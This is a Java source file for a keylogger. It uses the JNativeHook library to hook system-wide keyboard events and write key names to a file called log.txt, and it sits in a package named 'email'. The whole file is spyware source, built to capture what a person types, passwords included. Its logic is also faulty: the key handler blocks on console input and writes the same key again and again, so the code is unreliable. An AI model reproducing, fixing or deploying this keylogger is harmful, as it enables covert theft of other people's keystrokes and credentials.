package email;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.util.Scanner;

public class KeyLogger {
    private static KeyLogger instance = new KeyLogger();
    private boolean stopLogging = false;

    private KeyLogger() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.out.println("Some error with hook");
        }
    }

    public static KeyLogger getInstance() {
        return instance;
    }

    public void startLog(String filename) throws IOException {
        FileWriter writer = new FileWriter(filename, false);
        NativeKeyListener listener = new NativeKeyListener() {
            @Override
            public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
                Scanner scanner = new Scanner(System.in);
                while(!stopLogging) {
                    String input = scanner.nextLine();
                    if (input.equalsIgnoreCase("end")) {
                        stopLogging = true;
                    }
                    try {
                        writer.write(NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));
                        writer.write(" ");
                        writer.flush();
                    } catch (IOException e) {
                        System.out.println("Error when logging");
                        e.printStackTrace();
                    }
                }
            }

        };
        GlobalScreen.addNativeKeyListener(listener);

    }

    public static void main(String[] args) {
        System.out.println("Start log...");
        try {
            KeyLogger.getInstance().startLog("log.txt");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        System.out.println("End");
    }
}